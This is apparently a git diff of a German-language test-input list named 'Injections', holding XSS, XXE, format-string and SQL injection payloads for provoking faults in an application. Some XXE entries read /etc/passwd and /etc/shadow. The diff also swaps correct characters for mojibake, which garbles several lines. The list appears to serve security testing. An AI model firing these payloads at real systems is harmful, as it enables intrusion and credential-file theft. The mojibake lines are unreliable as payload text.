@@ -1,6 +1,6 @@
 Injections
 In dieser Datei sind Eingabewerte, welche Fehlverhalten in einer Anwendung provozieren.
-Diese Eingabewerte sind ausführbarer Code und zielen darauf Fehler bei der Trennung von Code- und Daten zu erzeugen.
+Diese Eingabewerte sind ausfÃ¼hrbarer Code und zielen darauf Fehler bei der Trennung von Code- und Daten zu erzeugen.
 
 Diese Liste kann nach belieben erweitert werden.
 
@@ -10,7 +10,7 @@ XSS
 	<b onmouseover=alert('2')>click me!</b>
 	<IMG SRC=j&#X41vascript:alert('3')>
 	<script>alert("4")</script>
-	“><script>alert('5')</script>
+	â€œ><script>alert('5')</script>
 	"><script >alert('6')</script >
 	"><ScRiPt>alert(document.cookie)</ScRiPt>
 	"%3cscript%3ealert('7')%3c/script%3e
@@ -24,21 +24,21 @@ XSS
 	
 XML	
 	<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
-	<?xml version=”1.0” encoding=”ISO-8859-1”?><foo><![CDATA[<]]>
-	SCRIPT<![CDATA[>]]>alert(‘gotcha’);<![CDATA[<]]>/
+	<?xml version=â€1.0â€ encoding=â€ISO-8859-1â€?><foo><![CDATA[<]]>
+	SCRIPT<![CDATA[>]]>alert(â€˜gotchaâ€™);<![CDATA[<]]>/
 	SCRIPT<![CDATA[>]]></foo>
-	<?xml version=”1.0” encoding=”ISO-8859-1”?><foo><![CDATA[‘
-	or 1=1 or ‘’=’]]></foof>
-	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
-	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM “file://c:/boot.
-	ini”>]><foo>&xee;</foo>
-	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
-	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM “file:///etc/
-	passwd”>]><foo>&xee;</foo>
-	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
-	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM “file:///etc/
-	shadow”>]><foo>&xee;</foo>
-	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
+	<?xml version=â€1.0â€ encoding=â€ISO-8859-1â€?><foo><![CDATA[â€˜
+	or 1=1 or â€˜â€™=â€™]]></foof>
+	<?xml version=â€1.0â€ encoding=â€ISO-8859-1â€?><!DOCTYPE
+	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM â€œfile://c:/boot.
+	iniâ€>]><foo>&xee;</foo>
+	<?xml version=â€1.0â€ encoding=â€ISO-8859-1â€?><!DOCTYPE
+	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM â€œfile:///etc/
+	passwdâ€>]><foo>&xee;</foo>
+	<?xml version=â€1.0â€ encoding=â€ISO-8859-1â€?><!DOCTYPE
+	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM â€œfile:///etc/
+	shadowâ€>]><foo>&xee;</foo>
+	<?xml version=â€1.0â€ encoding=â€ISO-8859-1â€?><!DOCTYPE
 	
 String	
 	%s%p%x%d
@@ -61,27 +61,27 @@ String
 	%s x 129
 	
 SQL	
-	‘||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+	â€˜||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 	||6
-	‘||’6
+	â€˜||â€™6
 	(||6)
-	‘ OR 1=1--
+	â€˜ OR 1=1--
 	OR 1=1
-	‘ OR ‘1’=’1
-	; OR ‘1’=’1’
+	â€˜ OR â€˜1â€™=â€™1
+	; OR â€˜1â€™=â€™1â€™
 	%22+or+isnull%281%2F0%29+%2F*
 	%27+OR+%277659%27%3D%277659
 	%22+or+isnull%281%2F0%29+%2F*
 	%27+--+
-	‘ or 1=1--
-	“ or 1=1--
-	‘ or 1=1 /*
+	â€˜ or 1=1--
+	â€œ or 1=1--
+	â€˜ or 1=1 /*
 	or 1=1--
-	‘ or ‘a’=’a
-	“ or “a”=”a
-	‘) or (‘a’=’a
-	Admin’ OR ‘
-	‘%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.
+	â€˜ or â€˜aâ€™=â€™a
+	â€œ or â€œaâ€=â€a
+	â€˜) or (â€˜aâ€™=â€™a
+	Adminâ€™ OR â€˜
+	â€˜%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.
 	TABLES--
 	) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.
 	TABLES
